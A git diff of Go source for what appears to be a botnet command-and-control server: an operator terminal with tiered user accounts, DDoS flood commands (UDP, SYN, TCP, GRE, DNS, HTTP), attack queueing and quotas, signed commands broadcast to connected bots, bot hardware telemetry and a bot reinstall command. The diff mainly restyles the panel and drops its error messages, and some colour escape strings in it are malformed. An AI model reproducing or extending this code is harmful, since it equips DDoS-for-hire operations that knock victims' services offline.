-				users[idx].LockedUntil = time.Now().Add(30 * time.Minute)
-				logAuditEvent(username, "AUTH", "Account locked for 30 minutes due to too many failed attempts")
-			}
-			saveUsers(users)
-			logAuditEvent(username, "AUTH", "Invalid password")
-			return false, nil
-		}
-	}
-	logAuditEvent(username, "AUTH", "User not found")
-	return false, nil
-}
-
-func saveUsers(users []User) {
-	bytes, _ := json.MarshalIndent(users, "", "  ")
-	os.WriteFile(cfg.UsersFile, bytes, 0600)
-}
-
-func setTitle(conn net.Conn, title string) {
-	conn.Write([]byte(fmt.Sprintf("\033]0;%s\007", title)))
-}
-
-func updateTitle() {
-	spinChars := []rune{'⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'}
-	spinIndex := 0
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		attackCount := attackManagerInstance.countAttacks()
-		botCount := getBotCount()
-		uptime := time.Since(serverStartTime).Round(time.Second)
-
-		for _, c := range clients {
-			spinChar := spinChars[spinIndex]
-			title := fmt.Sprintf("%c━━━%c━━[User: %s]━━%c━━[Bots: %d]━━%c━━[Attacks: %d/%d]━━%c━━[Uptime: %s]━━%c━━━%c",
-				spinChar, spinChar, c.user.Username, spinChar, botCount, spinChar,
-				attackCount, attackManagerInstance.getMaxAttacks(), spinChar, uptime, spinChar, spinChar)
-			setTitle(c.conn, title)
-		}
-		spinIndex = (spinIndex + 1) % len(spinChars)
-	}
-}
-
-func (am *attackManager) removeAttack(conn net.Conn) {
-	am.mutex.Lock()
-	defer am.mutex.Unlock()
-	delete(am.attacks, conn)
-	am.processQueue()
-}
-
-func (am *attackManager) processQueue() {
-	if len(am.attacks) < am.getMaxAttacks() && len(am.attackQueue) > 0 {
-		sort.Slice(am.attackQueue, func(i, j int) bool {
-			return am.attackQueue[i].Priority > am.attackQueue[j].Priority
-		})
-		nextAttack := am.attackQueue[0]
-		am.attackQueue = am.attackQueue[1:]
-		launchAttack(nextAttack.Conn, nextAttack)
-		msg := fmt.Sprintf("Your attack on %s:%s has started (was queued for %s)",
-			nextAttack.IP, nextAttack.Port, time.Since(nextAttack.QueueTime).Round(time.Second))
-		for _, c := range clients {
-			if c.user.Username == nextAttack.User {
-				animateText(c.conn, msg, 15*time.Millisecond, ColorSuccess)
-				break
-			}
-		}
-	}
-}
-
-func launchAttack(conn net.Conn, attack Attack) {
-	attackManagerInstance.attacks[conn] = attack
-	cmd := fmt.Sprintf("%s %s %s %s", attack.Method, attack.IP, attack.Port,
-		strconv.Itoa(int(attack.Duration.Seconds())))
-	sig := signCommand(cmd)
-	sendToBots(fmt.Sprintf("%s %s", cmd, sig), attack.User)
-	go func() {
-		time.Sleep(attack.Duration)
-		attackManagerInstance.removeAttack(conn)
-		logAuditEvent(attack.User, "ATTACK", fmt.Sprintf("Attack finished on %s:%s", attack.IP, attack.Port))
-		animateText(conn, "Attack has automatically finished and was removed.", 15*time.Millisecond, ColorSuccess)
-	}()
-}
-
-func (am *attackManager) getAttacks() []Attack {
-	am.mutex.RLock()
-	defer am.mutex.RUnlock()
-	attacks := make([]Attack, 0, len(am.attacks))
-	for _, a := range am.attacks {
-		attacks = append(attacks, a)
-	}
-	return attacks
-}
-
-func (am *attackManager) countAttacks() int {
-	am.mutex.RLock()
-	defer am.mutex.RUnlock()
-	return len(am.attacks)
-}
-
-func (am *attackManager) getMaxAttacks() int {
-	return cfg.MaxQueuedAttacks
-}
-
-func (am *attackManager) getUserQueuedAttacks(username string) []Attack {
-	am.mutex.RLock()
-	defer am.mutex.RUnlock()
-	var userAttacks []Attack
-	for _, a := range am.attackQueue {
-		if a.User == username {
-			userAttacks = append(userAttacks, a)
-		}
-	}
-	return userAttacks
-}
-
-func (am *attackManager) cancelQueuedAttack(username string, index int) bool {
-	am.mutex.Lock()
-	defer am.mutex.Unlock()
-	found := 0
-	for idx, a := range am.attackQueue {
-		if a.User == username {
-			if found == index {
-				am.attackQueue = append(am.attackQueue[:idx], am.attackQueue[idx+1:]...)
-				return true
-			}
-			found++
-		}
-	}
-	return false
-}
-
-func colorizeText(text, colorCode string) string {
-	return fmt.Sprintf("\033[38;5;%sm%s\033[0m", colorCode, text)
-}
-
-func animateText(conn net.Conn, text string, delay time.Duration, color string) {
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm", color)))
-	for idx := 0; idx < len(text); idx++ {
-		conn.Write([]byte(string(text[idx])))
-		time.Sleep(delay)
-	}
-	conn.Write([]byte("\033[0m\r\n"))
-}
-
-func sendToBots(command, user string) {
-	logAuditEvent(user, "COMMAND", fmt.Sprintf("Sent command to bots: %s", command))
-	for _, botConn := range botConns {
-		botConn.Write([]byte(command + "\r\n"))
-	}
-}
-
-func removeClient(conn net.Conn) {
-	for idx, c := range clients {
-		if c.conn == conn {
-			clients = append(clients[:idx], clients[idx+1:]...)
-			break
-		}
-	}
-}
-
-func cleanSessions() {
-	ticker := time.NewTicker(5 * time.Minute)
-	defer ticker.Stop()
-	for range ticker.C {
-		now := time.Now()
-		sessionStore.Range(func(key, value interface{}) bool {
-			sess := value.(*session)
-			if now.Sub(sess.lastActive) > cfg.SessionTimeout || now.After(sess.expires) {
-				if keyStr, ok := key.(string); ok {
-					sessionStore.Delete(keyStr)
-				}
-				userSessionLock.Lock()
-				userSessions[sess.client.user.Username]--
-				userSessionLock.Unlock()
-				logAuditEvent(sess.client.user.Username, "SESSION", "Session expired due to inactivity")
-			}
-			return true
-		})
-	}
-}
-
-func cleanRateLimiters() {
-	ticker := time.NewTicker(5 * time.Minute)
-	defer ticker.Stop()
-	for range ticker.C {
-		limiterMutex.Lock()
-		now := time.Now()
-		for ip, limiter := range ipLimiterMap {
-			if now.Sub(limiter.lastSeen) > 5*time.Minute {
-				delete(ipLimiterMap, ip)
-			}
-		}
-		for user, limiter := range userLimiterMap {
-			if now.Sub(limiter.lastSeen) > 5*time.Minute {
-				delete(userLimiterMap, user)
-			}
-		}
-		limiterMutex.Unlock()
-	}
-}
-
-func cleanBlockedIPs() {
-	ticker := time.NewTicker(1 * time.Hour)
-	defer ticker.Stop()
-	for range ticker.C {
-		blockedIPsLock.Lock()
-		for ip, blockTime := range blockedIPs {
-			if time.Since(blockTime) > 24*time.Hour {
-				delete(blockedIPs, ip)
-			}
-		}
-		blockedIPsLock.Unlock()
-	}
-}
-
-func getBotCount() int {
-	botCountLock.Lock()
-	defer botCountLock.Unlock()
-	return botCount
-}
-
-func incrementBotCount() {
-	botCountLock.Lock()
-	defer botCountLock.Unlock()
-	botCount++
-}
-
-func decrementBotCount() {
-	botCountLock.Lock()
-	defer botCountLock.Unlock()
-	botCount--
-}
-
-func handleRequest(conn net.Conn) {
-	reader := bufio.NewReader(conn)
-	conn.Write([]byte("\033]0;Authentication Required\007"))
-	readString, err := reader.ReadString('\n')
-	if err != nil {
+func handleBotPong(conn net.Conn, readString string) {
+	remoteAddr := conn.RemoteAddr().(*net.TCPAddr).IP.String()
+	parts := strings.Split(readString, ":")
+	if len(parts) < 3 {
 		return
 	}
-	readString = strings.TrimSpace(readString)
-	if strings.HasPrefix(readString, "PONG") {
-		handleBotPong(conn, readString)
+	botArch, _ := hex.DecodeString(parts[1])
+	statsData, _ := hex.DecodeString(parts[2])
+	statParts := strings.Split(string(statsData), "|")
+	if len(statParts) < 4 {
 		return
 	}
-	if strings.HasPrefix(readString, "loginforme") {
-		if authed, client := authUser(conn); authed {
-			handleClientSession(conn, client)
-		}
+	latencySec, _ := strconv.ParseFloat(statParts[0], 64)
+	latency := time.Duration(latencySec * float64(time.Second))
+	throughput, _ := strconv.ParseFloat(statParts[1], 64)
+	ram, _ := strconv.ParseFloat(statParts[2], 64)
+	cores, _ := strconv.Atoi(statParts[3])
+	botStatsLock.Lock()
+	botPerformance[remoteAddr] = BotStats{
+		LastSeen:     time.Now(),
+		Latency:      latency,
+		Throughput:   throughput,
+		RAM:          ram,
+		Cores:        cores,
+		Architecture: string(botArch),
 	}
-}
-
-func handleClientSession(conn net.Conn, c *client) {
-	defer func() {
-		userSessionLock.Lock()
-		userSessions[c.user.Username]--
-		userSessionLock.Unlock()
-		sessionStore.Delete(c.sessionID)
-		c.cancel()
-		logAuditEvent(c.user.Username, "SESSION", "Session terminated")
-	}()
-	reader := bufio.NewReader(conn)
-	for {
-		conn.Write([]byte(getPrompt(c.user.GetLevel())))
-		readString, _ := reader.ReadString('\n')
-		readString = strings.TrimSpace(readString)
-		parts := strings.Fields(readString)
-		if len(parts) < 1 {
-			continue
-		}
-		ipLimiter := getIPLimiter(c.remoteAddr)
-		userLimiter := getUserLimiter(c.user.Username)
-		if !ipLimiter.limiter.Allow() || !userLimiter.limiter.Allow() {
-			animateText(conn, "Rate limit exceeded. Please wait...\r", 15*time.Millisecond, ColorWarning)
-			continue
-		}
-		if time.Since(c.lastCommand) < 2*time.Second {
-			animateText(conn, "Command rate limited. Please wait...\r", 15*time.Millisecond, ColorWarning)
-			continue
-		}
-		c.lastCommand = time.Now()
-		command := parts[0]
-		switch strings.ToLower(command) {
-		case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
-			handleAttackCommand(conn, parts, c)
-		case "ongoing":
-			displayOngoingAttacks(conn)
-		case "queue":
-			displayQueuedAttacks(conn, c)
-		case "cancel":
-			handleCancelAttack(conn, parts, c)
-		case "bots", "bot":
-			displayBotCount(conn)
-		case "cls", "clear":
-			conn.Write([]byte("\033[2J\033[H"))
-		case "logout", "exit":
-			animateText(conn, "Logging out... Goodbye!", 15*time.Millisecond, ColorAccent1)
-			return
-		case "!reinstall":
-			if c.user.GetLevel() <= 1 {
-				sendToBots("!reinstall", c.user.Username)
-				animateText(conn, "Reinstall command sent to all bots.", 15*time.Millisecond, ColorSuccess)
-			} else {
-				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to use !reinstall without sufficient privileges")
-				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
-			}
-		case "help":
-			displayHelp(conn, c.user.GetLevel())
-		case "db":
-			if c.user.GetLevel() <= 1 {
-				displayUserDatabase(conn)
-			} else {
-				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to access user database without sufficient privileges")
-				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
-			}
-		case "logs":
-			if c.user.GetLevel() <= 1 {
-				displayAuditLogs(conn)
-			} else {
-				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to access audit logs without sufficient privileges")
-				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
-			}
-		case "adduser":
-			if c.user.GetLevel() <= 1 {
-				handleAddUser(conn, parts)
-			} else {
-				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to add user without sufficient privileges")
-				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
-			}
-		case "deluser":
-			if c.user.GetLevel() <= 1 {
-				handleDeleteUser(conn, parts)
-			} else {
-				logAuditEvent(c.user.Username, "PERMISSION", "Attempted to delete user without sufficient privileges")
-				animateText(conn, "Permission denied: Admin level required", 15*time.Millisecond, ColorError)
-			}
-		case "resetpw":
-			handleResetPassword(conn, c, parts)
-		case "?":
-			displayQuickHelp(conn)
-		case "status":
-			displayServerStatus(conn)
-		case "stop":
-			attackManagerInstance.removeAttack(conn)
-			animateText(conn, "Stopped current attack", 15*time.Millisecond, ColorSuccess)
-		case "stats":
-			displayBotStats(conn)
-		default:
-			logAuditEvent(c.user.Username, "COMMAND", fmt.Sprintf("Invalid command: %s", command))
-			animateText(conn, "Invalid command. Type 'help' for assistance.\r", 15*time.Millisecond, ColorError)
-		}
-	}
-}
-
-func getPrompt(userLevel int) string {
-	var levelName string
-	var levelColor string
-	switch userLevel {
-	case 0:
-		levelName = "OWNER"
-		levelColor = ColorSystem
-	case 1:
-		levelName = "ADMIN"
-		levelColor = ColorAccent1
-	case 2:
-		levelName = "PRO"
-		levelColor = ColorMid2
-	default:
-		levelName = "BASIC"
-		levelColor = ColorMid1
-	}
-	return fmt.Sprintf("\n\r\033[38;5;%sm[\033[38;5;%smPr\033[38;5;%smo\033[38;5;%smmpt\033[38;5;%sm]@[%s]\033[38;5;%sm► \033[0m",
-		ColorMid1, ColorStart, ColorMid2, ColorMid3, ColorMid1,
-		colorizeText(levelName, levelColor), ColorSuccess)
+	botStatsLock.Unlock()
 }
 
 func handleAttackCommand(conn net.Conn, parts []string, c *client) {
 	if c.user.GetLevel() > 2 {
 		allowed := map[string]bool{"!udpflood": true, "!tcpflood": true}
 		if !allowed[parts[0]] {
-			animateText(conn, "Permission denied: Method not allowed for your level", 15*time.Millisecond, ColorError)
 			return
 		}
 	}
 	if len(parts) < 4 {
-		animateText(conn, "Error: Usage: method ip port duration", 15*time.Millisecond, ColorError)
 		return
 	}
 	method := parts[0]
@@ -1179,30 +1873,25 @@ func handleAttackCommand(conn net.Conn, parts []string, c *client) {
 	port := parts[2]
 	duration := parts[3]
 	if !allowedMethods[method] {
-		animateText(conn, "Error: Invalid attack method", 10*time.Millisecond, ColorError)
 		return
 	}
 	if !validateIP(ip) {
-		animateText(conn, "Error: Invalid IP address", 10*time.Millisecond, ColorError)
 		return
 	}
 	if !validatePort(port) {
-		animateText(conn, "Error: Invalid port number (1-65535)", 15*time.Millisecond, ColorError)
 		return
 	}
 	if !validateDuration(duration) {
-		animateText(conn, "Error: Invalid duration format. Use seconds (e.g., 60)", 15*time.Millisecond, ColorError)
 		return
 	}
 	dur, _ := time.ParseDuration(duration + "s")
 	userLimiter := getUserLimiter(c.user.Username)
 	if !userLimiter.canAttack() {
-		animateText(conn, "Daily attack quota exceeded", 15*time.Millisecond, ColorError)
 		return
 	}
 	userLimiter.attacksToday++
-	logAuditEvent(c.user.Username, "ATTACK", fmt.Sprintf("Launched %s attack on %s:%s for %s seconds", method, ip, port, duration))
 	displayAttackLaunch(conn, method, ip, port, duration)
+	logAuditEvent(c.user.Username, "ATTACK", fmt.Sprintf("Launched %s attack on %s:%s for %s seconds", method, ip, port, duration))
 	priority := 0
 	switch c.user.GetLevel() {
 	case 0:
@@ -1214,7 +1903,7 @@ func handleAttackCommand(conn net.Conn, parts []string, c *client) {
 	}
 	attack := Attack{
 		Method:    method,
-		IP:        ip,
+		Target:    ip,
 		Port:      port,
 		Duration:  dur,
 		Start:     time.Now(),
@@ -1228,12 +1917,9 @@ func handleAttackCommand(conn net.Conn, parts []string, c *client) {
 	defer attackManagerInstance.mutex.Unlock()
 	if len(attackManagerInstance.attacks) >= attackManagerInstance.getMaxAttacks() {
 		if len(attackManagerInstance.attackQueue) >= cfg.MaxQueuedAttacks {
-			animateText(conn, "Error: Attack queue is full", 15*time.Millisecond, ColorError)
 			return
 		}
 		attackManagerInstance.attackQueue = append(attackManagerInstance.attackQueue, attack)
-		animateText(conn, fmt.Sprintf("Attack queued (position %d)", len(attackManagerInstance.attackQueue)),
-			15*time.Millisecond, ColorWarning)
 		return
 	}
 	launchAttack(conn, attack)
@@ -1242,98 +1928,119 @@ func handleAttackCommand(conn net.Conn, parts []string, c *client) {
 func displayQueuedAttacks(conn net.Conn, c *client) {
 	attacks := attackManagerInstance.getUserQueuedAttacks(c.user.Username)
 	if len(attacks) == 0 {
-		animateText(conn, "No queued attacks found.\n\r", 15*time.Millisecond, ColorInfo)
 		return
 	}
 	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
-	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
-		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
 	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    QUEUED ATTACKS    \033[0m\n\r",
-		ColorMid1, ColorAccent1)
+	title := "\033[38;5;240sm|\033[38;5;251sm    QUEUED ATTACKS    \033[0m\n\r"
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	headers := fmt.Sprintf("\033[38;5;%sm| %-3s | %-9s | %-15s | %-5s | %-8s | %-10s |\033[0m\n\r",
-		ColorMid1, "ID", "Method", "Target", "Port", "Duration", "Queued For")
+	headers := fmt.Sprintf("\033[38;5;240sm| %-3s | %-9s | %-15s | %-5s | %-8s | %-10s |\033[0m\n\r",
+		"ID", "Method", "Target", "Port", "Duration", "Queued For")
 	conn.Write([]byte(headers))
 	conn.Write([]byte(border))
 	for idx, attack := range attacks {
-		row := fmt.Sprintf("\033[38;5;%sm| %-3d | %-9s | %-15s | %-5s | %-8ds | %-10s |\033[0m\n\r",
-			ColorMid2,
+		row := fmt.Sprintf("\033[38;5;243sm| %-3d | %-9s | %-15s | %-5s | %-8ds | %-10s |\033[0m\n\r",
 			idx+1,
 			attack.Method,
-			attack.IP,
+			attack.Target,
 			attack.Port,
 			int(attack.Duration.Seconds()),
 			time.Since(attack.QueueTime).Round(time.Second))
 		conn.Write([]byte(row))
 	}
 	conn.Write([]byte(border))
-	animateText(conn, "Use 'cancel <ID>' to remove a queued attack", 15*time.Millisecond, ColorInfo)
 }
 
-func handleCancelAttack(conn net.Conn, parts []string, c *client) {
+func handleCancelAttack(parts []string, c *client) {
 	if len(parts) < 2 {
-		animateText(conn, "Usage: cancel <queue ID>", 15*time.Millisecond, ColorError)
 		return
 	}
 	index, _ := strconv.Atoi(parts[1])
 	if index < 1 {
-		animateText(conn, "Invalid queue ID", 15*time.Millisecond, ColorError)
 		return
 	}
 	if attackManagerInstance.cancelQueuedAttack(c.user.Username, index-1) {
-		animateText(conn, fmt.Sprintf("Cancelled queued attack #%d", index), 15*time.Millisecond, ColorSuccess)
 	} else {
-		animateText(conn, fmt.Sprintf("No queued attack found with ID %d", index), 15*time.Millisecond, ColorError)
+	}
+}
+
+func animateText(conn net.Conn, text string, delay time.Duration, color string) {
+	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm", color)))
+	for idx := 0; idx < len(text); idx++ {
+		conn.Write([]byte(string(text[idx])))
+		time.Sleep(delay)
+		if idx%10 == 0 {
+			if f, ok := conn.(interface{ Flush() error }); ok {
+				f.Flush()
+			}
+		}
+	}
+	conn.Write([]byte("\033[0m\r\n"))
+	if f, ok := conn.(interface{ Flush() error }); ok {
+		f.Flush()
 	}
 }
 
 func displayAttackLaunch(conn net.Conn, method, ip, port, duration string) {
 	conn.Write([]byte("\033[2J\033[H"))
-	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
-		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
-	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ATTACK LAUNCHED    \033[0m\n",
-		ColorMid1, ColorAccent1)
-	conn.Write([]byte(title))
-	conn.Write([]byte(border))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Method: \033[38;5;%sm%s\033[0m\n\r",
-		ColorMid1, ColorAccent2, method)))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Target: \033[38;5;%sm%s:%s\033[0m\n\r",
-		ColorMid1, ColorAccent2, ip, port)))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Duration: \033[38;5;%sm%s seconds\033[0m\n\r",
-		ColorMid1, ColorAccent2, duration)))
-	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm| Bots: \033[38;5;%sm%d\033[0m\n\r",
-		ColorMid1, ColorAccent2, getBotCount())))
-	conn.Write([]byte(border))
+	now := time.Now().Format("15:04:05")
+	animateText(conn, fmt.Sprintf("[%s] ATTACK LAUNCHED", now), 10*time.Millisecond, "45")
+	conn.Write([]byte("\r\n\r\n"))
+
+	details := []struct {
+		label string
+		value string
+		color string
+	}{
+		{"Method:", method, "51"},
+		{"Target:", fmt.Sprintf("%s:%s", ip, port), "118"},
+		{"Duration:", fmt.Sprintf("%s seconds", duration), "197"},
+		{"Bots:", fmt.Sprintf("%d", getBotCount()), "214"},
+		{"Status:", "SENT TO BOTS", "46"},
+	}
+
+	maxLabelLen := 0
+	for _, d := range details {
+		if len(d.label) > maxLabelLen {
+			maxLabelLen = len(d.label)
+		}
+	}
+
+	for _, detail := range details {
+		padding := strings.Repeat(" ", maxLabelLen-len(detail.label))
+		line := fmt.Sprintf("  %s%s %s", detail.label, padding, detail.value)
+		animateText(conn, line, 5*time.Millisecond, detail.color)
+	}
+
+	conn.Write([]byte("\r\n"))
+	animateText(conn, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", 5*time.Millisecond, "240")
+	conn.Write([]byte("\r\n\r\n"))
+	conn.Write([]byte("\033[2K\r"))
 }
 
 func displayOngoingAttacks(conn net.Conn) {
 	attacks := attackManagerInstance.getAttacks()
 	if len(attacks) == 0 {
-		animateText(conn, "No ongoing attacks found.\n\r", 15*time.Millisecond, ColorInfo)
 		return
 	}
 	conn.Write([]byte("\033[2J\033[H"))
-	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
-		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
 	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ONGOING ATTACKS    \033[0m\n\r",
-		ColorMid1, ColorAccent1)
+	title := "\033[38;5;240sm|\033[38;5;251sm    ONGOING ATTACKS    \033[0m\n\r"
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	headers := fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8s | %-15s | %-15s |\033[0m\n\r",
-		ColorMid1, "Method", "Target", "Port", "Duration", "Time Remaining", "User")
+	headers := fmt.Sprintf("\033[38;5;240sm| %-9s | %-10s | %-5s | %-8s | %-15s | %-15s |\033[0m\n\r",
+		"Method", "Target", "Port", "Duration", "Time Remaining", "User")
 	conn.Write([]byte(headers))
 	conn.Write([]byte(border))
 	for _, attack := range attacks {
 		remaining := time.Until(attack.Start.Add(attack.Duration))
 		if remaining > 0 {
-			row := fmt.Sprintf("\033[38;5;%sm| %-9s | %-10s | %-5s | %-8ds | %-15s | %-15s |\033[0m\n\r",
-				ColorMid2,
+			row := fmt.Sprintf("\033[38;5;243sm| %-9s | %-10s | %-5s | %-8ds | %-15s | %-15s |\033[0m\n\r",
 				attack.Method,
-				attack.IP,
+				attack.Target,
 				attack.Port,
 				int(attack.Duration.Seconds()),
 				remaining.Round(time.Second),
@@ -1347,26 +2054,21 @@ func displayOngoingAttacks(conn net.Conn) {
 func displayBotCount(conn net.Conn) {
 	count := getBotCount()
 	conn.Write([]byte("\033[2J\033[H"))
-	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
-		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
 	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    CONNECTED BOTS    \033[0m\n\r",
-		ColorMid1, ColorAccent1)
+	title := "\033[38;5;240sm|\033[38;5;251sm    CONNECTED BOTS    \033[0m\n\r"
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	content := fmt.Sprintf("\033[38;5;%sm| Total bots online: \033[38;5;%sm%d\033[0m\n\r",
-		ColorMid1, ColorAccent2, count)
+	content := fmt.Sprintf("\033[38;5;240sm| Total bots online: \033[38;5;254sm%d\033[0m\n\r", count)
 	conn.Write([]byte(content))
 	conn.Write([]byte(border))
 }
 
 func displayHelp(conn net.Conn, userLevel int) {
 	conn.Write([]byte("\033[2J\033[H"))
-	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
-		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
 	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    HELP    \033[0m\n\r",
-		ColorMid1, ColorAccent1)
+	title := "\033[38;5;240sm|\033[38;5;251sm    HELP    \033[0m\n\r"
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
 	commands := []struct {
@@ -1386,14 +2088,13 @@ func displayHelp(conn net.Conn, userLevel int) {
 		{"stats", "View bot performance stats"},
 	}
 	for _, cmd := range commands {
-		line := fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
-			ColorMid1, ColorAccent2, cmd.cmd, ColorAccent1, cmd.desc)
+		line := fmt.Sprintf("\033[38;5;240sm| \033[38;5;254sm%-15s \033[38;5;251sm- %s\033[0m\n\r",
+			cmd.cmd, cmd.desc)
 		conn.Write([]byte(line))
 	}
 	if userLevel <= 1 {
 		conn.Write([]byte(border))
-		adminTitle := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    ADMIN COMMANDS    \033[0m\n\r",
-			ColorMid1, ColorSystem)
+		adminTitle := "\033[38;5;240sm|\033[38;5;183sm    ADMIN COMMANDS    \033[0m\n\r"
 		conn.Write([]byte(adminTitle))
 		conn.Write([]byte(border))
 		adminCmds := []struct {
@@ -1407,8 +2108,8 @@ func displayHelp(conn net.Conn, userLevel int) {
 			{"resetpw", "Reset a user's password (resetpw <username>)"},
 		}
 		for _, cmd := range adminCmds {
-			line := fmt.Sprintf("\033[38;5;%sm| \033[38;5;%sm%-15s \033[38;5;%sm- %s\033[0m\n\r",
-				ColorMid1, ColorSystem, cmd.cmd, ColorSystem, cmd.desc)
+			line := fmt.Sprintf("\033[38;5;240sm| \033[38;5;183sm%-15s \033[38;5;183sm- %s\033[0m\n\r",
+				cmd.cmd, cmd.desc)
 			conn.Write([]byte(line))
 		}
 	}
@@ -1422,20 +2123,17 @@ func displayUserDatabase(conn net.Conn) {
 	var users []User
 	json.Unmarshal(data, &users)
 	conn.Write([]byte("\033[2J\033[H"))
-	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
-		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	border := "\033[38;5;237sm+\033[38;5;240sm-\033[38;5;243sm-\033[38;5;246sm-\033[38;5;249sm-\033[0m\n\r"
 	conn.Write([]byte(border))
-	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    USER DATABASE    \033[0m\n\r",
-		ColorMid1, ColorSystem)
+	title := "\033[38;5;240sm|\033[38;5;183sm    USER DATABASE    \033[0m\n\r"
 	conn.Write([]byte(title))
 	conn.Write([]byte(border))
-	headers := fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
-		ColorMid1, "Username", "Password", "Expiration", "Level", "Last Activity")
+	headers := fmt.Sprintf("\033[38;5;240sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
+		"Username", "Password", "Expiration", "Level", "Last Activity")
 	conn.Write([]byte(headers))
 	conn.Write([]byte(border))
 	for _, user := range users {
-		row := fmt.Sprintf("\033[38;5;%sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
-			ColorMid2,
+		row := fmt.Sprintf("\033[38;5;243sm| %-14s | %-14s | %-19s | %-10s | %-19s |\033[0m\n\r",
 			user.Username,
 			"********",
 			user.Expire.Format("2006-01-02"),
@@ -1446,9 +2144,8 @@ func displayUserDatabase(conn net.Conn) {
 	conn.Write([]byte(border))
 }
 
-func handleAddUser(conn net.Conn, parts []string) {
+func handleAddUser(parts []string) {
 	if len(parts) < 3 {
-		animateText(conn, "Usage: adduser <username> <level>", 15*time.Millisecond, ColorError)
 		return
 	}
 	username := sanitizeInput(parts[1])
@@ -1464,7 +2161,6 @@ func handleAddUser(conn net.Conn, parts []string) {
 	case "basic":
 		validLevel = "Basic"
 	default:
-		animateText(conn, "Invalid level. Must be owner, admin, pro, or basic", 15*time.Millisecond, ColorError)
 		return
 	}
 	users := []User{}
@@ -1473,15 +2169,16 @@ func handleAddUser(conn net.Conn, parts []string) {
 	}
 	for _, user := range users {
 		if user.Username == username {
-			animateText(conn, "Error: User already exists", 15*time.Millisecond, ColorError)
 			return
 		}
 	}
-	password, _ := generateSecureString(12)
+	password := randomString(12)
+	apiKey := randomString(64)
 	hashedPassword, _ := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
 	newUser := User{
 		Username:     username,
 		PasswordHash: string(hashedPassword),
+		APIKey:       apiKey,
 		Expire:       time.Now().AddDate(1, 0, 0),
 		Level:        validLevel,
 		CreatedAt:    time.Now(),
@@ -1490,17 +2187,14 @@ func handleAddUser(conn net.Conn, parts []string) {
 	users = append(users, newUser)
 	saveUsers(users)
 	logAuditEvent("SYSTEM", "USER", fmt.Sprintf("User %s created with level %s", username, validLevel))
-	animateText(conn, fmt.Sprintf("User %s created successfully with password: %s", username, password), 15*time.Millisecond, ColorSuccess)
 }
 
-func handleDeleteUser(conn net.Conn, parts []string) {
